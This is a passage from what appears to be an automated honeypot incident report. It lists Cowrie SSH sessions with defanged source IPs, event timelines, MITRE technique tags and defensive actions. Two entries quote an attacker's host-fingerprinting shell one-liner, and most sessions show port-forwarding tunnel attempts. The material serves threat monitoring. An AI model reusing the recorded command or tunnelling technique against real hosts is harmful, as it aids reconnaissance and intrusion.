| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:56:09` | `cowrie.session.connect` |
| `2026-07-23 19:56:11` | `cowrie.client.version` |
| `2026-07-23 19:56:11` | `cowrie.client.kex` |
| `2026-07-23 19:56:14` | `cowrie.login.success` |
| `2026-07-23 19:56:15` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd752936651

| Field | Detail |
|---|---|
| **Source IP** | `210.204.137[.]38` |
| **First Seen** | 2026-07-23 19:59 |
| **Last Seen** | 2026-07-23 19:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 19:59:17` | `cowrie.session.connect` |
| `2026-07-23 19:59:18` | `cowrie.client.version` |
| `2026-07-23 19:59:18` | `cowrie.client.kex` |
| `2026-07-23 19:59:20` | `cowrie.login.success` |
| `2026-07-23 19:59:21` | `cowrie.direct-tcpip.request` |
| `2026-07-23 19:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.204.137[.]38` to AbuseIPDB if not already reported
- [ ] Block `210.204.137[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bed3e4cab35

| Field | Detail |
|---|---|
| **Source IP** | `190.57.233[.]133` |
| **First Seen** | 2026-07-23 20:01 |
| **Last Seen** | 2026-07-23 20:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:01:47` | `cowrie.session.connect` |
| `2026-07-23 20:01:48` | `cowrie.client.version` |
| `2026-07-23 20:01:48` | `cowrie.client.kex` |
| `2026-07-23 20:01:50` | `cowrie.login.success` |
| `2026-07-23 20:01:50` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.57.233[.]133` to AbuseIPDB if not already reported
- [ ] Block `190.57.233[.]133` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95a251d0c09

| Field | Detail |
|---|---|
| **Source IP** | `62.182.132[.]94` |
| **First Seen** | 2026-07-23 20:01 |
| **Last Seen** | 2026-07-23 20:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:01:50` | `cowrie.session.connect` |
| `2026-07-23 20:01:50` | `cowrie.client.version` |
| `2026-07-23 20:01:50` | `cowrie.client.kex` |
| `2026-07-23 20:01:51` | `cowrie.login.success` |
| `2026-07-23 20:01:52` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.132[.]94` to AbuseIPDB if not already reported
- [ ] Block `62.182.132[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df1d9603337

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-07-23 20:01 |
| **Last Seen** | 2026-07-23 20:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:01:55` | `cowrie.session.connect` |
| `2026-07-23 20:01:56` | `cowrie.client.version` |
| `2026-07-23 20:01:56` | `cowrie.client.kex` |
| `2026-07-23 20:01:57` | `cowrie.login.success` |
| `2026-07-23 20:01:57` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91916b2d9868

| Field | Detail |
|---|---|
| **Source IP** | `116.113.241[.]82` |
| **First Seen** | 2026-07-23 20:01 |
| **Last Seen** | 2026-07-23 20:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:01:57` | `cowrie.session.connect` |
| `2026-07-23 20:01:58` | `cowrie.client.version` |
| `2026-07-23 20:01:58` | `cowrie.client.kex` |
| `2026-07-23 20:02:00` | `cowrie.login.success` |
| `2026-07-23 20:02:00` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.113.241[.]82` to AbuseIPDB if not already reported
- [ ] Block `116.113.241[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e189ecee99

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]8` |
| **First Seen** | 2026-07-23 20:04 |
| **Last Seen** | 2026-07-23 20:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:04:59` | `cowrie.session.connect` |
| `2026-07-23 20:04:59` | `cowrie.client.version` |
| `2026-07-23 20:04:59` | `cowrie.client.kex` |
| `2026-07-23 20:05:01` | `cowrie.login.success` |
| `2026-07-23 20:05:02` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]8` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c536656235b0

| Field | Detail |
|---|---|
| **Source IP** | `60.171.135[.]254` |
| **First Seen** | 2026-07-23 20:05 |
| **Last Seen** | 2026-07-23 20:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:05:07` | `cowrie.session.connect` |
| `2026-07-23 20:05:08` | `cowrie.client.version` |
| `2026-07-23 20:05:08` | `cowrie.client.kex` |
| `2026-07-23 20:05:10` | `cowrie.login.success` |
| `2026-07-23 20:05:11` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.171.135[.]254` to AbuseIPDB if not already reported
- [ ] Block `60.171.135[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11d40f6f07e2

| Field | Detail |
|---|---|
| **Source IP** | `58.34.174[.]90` |
| **First Seen** | 2026-07-23 20:09 |
| **Last Seen** | 2026-07-23 20:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:09:41` | `cowrie.session.connect` |
| `2026-07-23 20:09:42` | `cowrie.client.version` |
| `2026-07-23 20:09:42` | `cowrie.client.kex` |
| `2026-07-23 20:09:44` | `cowrie.login.success` |
| `2026-07-23 20:09:45` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.34.174[.]90` to AbuseIPDB if not already reported
- [ ] Block `58.34.174[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7663c950e878

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-07-23 20:09 |
| **Last Seen** | 2026-07-23 20:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:09:50` | `cowrie.session.connect` |
| `2026-07-23 20:09:50` | `cowrie.client.version` |
| `2026-07-23 20:09:50` | `cowrie.client.kex` |
| `2026-07-23 20:09:51` | `cowrie.login.success` |
| `2026-07-23 20:09:51` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e179d4ab3f0b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-23 20:10 |
| **Last Seen** | 2026-07-23 20:10 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:10:09` | `cowrie.session.connect` |
| `2026-07-23 20:10:13` | `cowrie.client.version` |
| `2026-07-23 20:10:13` | `cowrie.client.kex` |
| `2026-07-23 20:10:34` | `cowrie.login.success` |
| `2026-07-23 20:10:39` | `cowrie.session.params` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:39` | `cowrie.command.success` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:39` | `cowrie.command.input` |
| `2026-07-23 20:10:41` | `cowrie.log.closed` |
| `2026-07-23 20:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469c7e5608cd

| Field | Detail |
|---|---|
| **Source IP** | `118.26.153[.]102` |
| **First Seen** | 2026-07-23 20:12 |
| **Last Seen** | 2026-07-23 20:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:12:57` | `cowrie.session.connect` |
| `2026-07-23 20:12:58` | `cowrie.client.version` |
| `2026-07-23 20:12:58` | `cowrie.client.kex` |
| `2026-07-23 20:13:00` | `cowrie.login.success` |
| `2026-07-23 20:13:00` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.153[.]102` to AbuseIPDB if not already reported
- [ ] Block `118.26.153[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d189f576a18b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-23 20:16 |
| **Last Seen** | 2026-07-23 20:16 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:16:00` | `cowrie.session.connect` |
| `2026-07-23 20:16:02` | `cowrie.client.version` |
| `2026-07-23 20:16:02` | `cowrie.client.kex` |
| `2026-07-23 20:16:24` | `cowrie.login.success` |
| `2026-07-23 20:16:26` | `cowrie.session.params` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.command.success` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.command.input` |
| `2026-07-23 20:16:26` | `cowrie.log.closed` |
| `2026-07-23 20:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d562392c695

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-23 20:17 |
| **Last Seen** | 2026-07-23 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:17:45` | `cowrie.session.connect` |
| `2026-07-23 20:17:45` | `cowrie.client.version` |
| `2026-07-23 20:17:45` | `cowrie.client.kex` |
| `2026-07-23 20:17:45` | `cowrie.login.success` |
| `2026-07-23 20:17:45` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:17:45` | `cowrie.direct-tcpip.ja4` |
| `2026-07-23 20:17:45` | `cowrie.direct-tcpip.data` |
| `2026-07-23 20:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-459f9fe9f732

| Field | Detail |
|---|---|
| **Source IP** | `220.178.39[.]106` |
| **First Seen** | 2026-07-23 20:19 |
| **Last Seen** | 2026-07-23 20:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:19:15` | `cowrie.session.connect` |
| `2026-07-23 20:19:15` | `cowrie.client.version` |
| `2026-07-23 20:19:15` | `cowrie.client.kex` |
| `2026-07-23 20:19:17` | `cowrie.login.success` |
| `2026-07-23 20:19:18` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.39[.]106` to AbuseIPDB if not already reported
- [ ] Block `220.178.39[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47dd5a9b27d9

| Field | Detail |
|---|---|
| **Source IP** | `103.67.152[.]201` |
| **First Seen** | 2026-07-23 20:22 |
| **Last Seen** | 2026-07-23 20:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:22:09` | `cowrie.session.connect` |
| `2026-07-23 20:22:10` | `cowrie.client.version` |
| `2026-07-23 20:22:10` | `cowrie.client.kex` |
| `2026-07-23 20:22:12` | `cowrie.login.success` |
| `2026-07-23 20:22:12` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efb73c71ba67

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-23 20:23 |
| **Last Seen** | 2026-07-23 20:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:23:17` | `cowrie.session.connect` |
| `2026-07-23 20:23:17` | `cowrie.client.version` |
| `2026-07-23 20:23:17` | `cowrie.client.kex` |
| `2026-07-23 20:23:17` | `cowrie.login.success` |
| `2026-07-23 20:23:17` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:23:18` | `cowrie.direct-tcpip.ja4` |
| `2026-07-23 20:23:18` | `cowrie.direct-tcpip.data` |
| `2026-07-23 20:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04aeaaf9cbcf

| Field | Detail |
|---|---|
| **Source IP** | `124.133.10[.]66` |
| **First Seen** | 2026-07-23 20:25 |
| **Last Seen** | 2026-07-23 20:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:25:53` | `cowrie.session.connect` |
| `2026-07-23 20:25:53` | `cowrie.client.version` |
| `2026-07-23 20:25:53` | `cowrie.client.kex` |
| `2026-07-23 20:25:55` | `cowrie.login.success` |
| `2026-07-23 20:25:56` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:26:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.133.10[.]66` to AbuseIPDB if not already reported
- [ ] Block `124.133.10[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06b5e0239a94

| Field | Detail |
|---|---|
| **Source IP** | `118.122.196[.]230` |
| **First Seen** | 2026-07-23 20:26 |
| **Last Seen** | 2026-07-23 20:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:26:06` | `cowrie.session.connect` |
| `2026-07-23 20:26:06` | `cowrie.client.version` |
| `2026-07-23 20:26:06` | `cowrie.client.kex` |
| `2026-07-23 20:26:08` | `cowrie.login.success` |
| `2026-07-23 20:26:09` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.196[.]230` to AbuseIPDB if not already reported
- [ ] Block `118.122.196[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794731cd7b10

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-07-23 20:29 |
| **Last Seen** | 2026-07-23 20:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:29:16` | `cowrie.session.connect` |
| `2026-07-23 20:29:17` | `cowrie.client.version` |
| `2026-07-23 20:29:17` | `cowrie.client.kex` |
| `2026-07-23 20:29:19` | `cowrie.login.success` |
| `2026-07-23 20:29:20` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7f37e868908

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]64` |
| **First Seen** | 2026-07-23 20:29 |
| **Last Seen** | 2026-07-23 20:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:29:31` | `cowrie.session.connect` |
| `2026-07-23 20:29:32` | `cowrie.client.version` |
| `2026-07-23 20:29:32` | `cowrie.client.kex` |
| `2026-07-23 20:29:34` | `cowrie.login.success` |
| `2026-07-23 20:29:35` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]64` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b8c55b8295

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-07-23 20:29 |
| **Last Seen** | 2026-07-23 20:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:29:40` | `cowrie.session.connect` |
| `2026-07-23 20:29:40` | `cowrie.client.version` |
| `2026-07-23 20:29:40` | `cowrie.client.kex` |
| `2026-07-23 20:29:42` | `cowrie.login.success` |
| `2026-07-23 20:29:43` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e0aad23fb0

| Field | Detail |
|---|---|
| **Source IP** | `186.103.136[.]43` |
| **First Seen** | 2026-07-23 20:33 |
| **Last Seen** | 2026-07-23 20:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:33:55` | `cowrie.session.connect` |
| `2026-07-23 20:33:56` | `cowrie.client.version` |
| `2026-07-23 20:33:56` | `cowrie.client.kex` |
| `2026-07-23 20:33:57` | `cowrie.login.success` |
| `2026-07-23 20:33:58` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.136[.]43` to AbuseIPDB if not already reported
- [ ] Block `186.103.136[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d84f770b219

| Field | Detail |
|---|---|
| **Source IP** | `60.175.91[.]53` |
| **First Seen** | 2026-07-23 20:37 |
| **Last Seen** | 2026-07-23 20:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

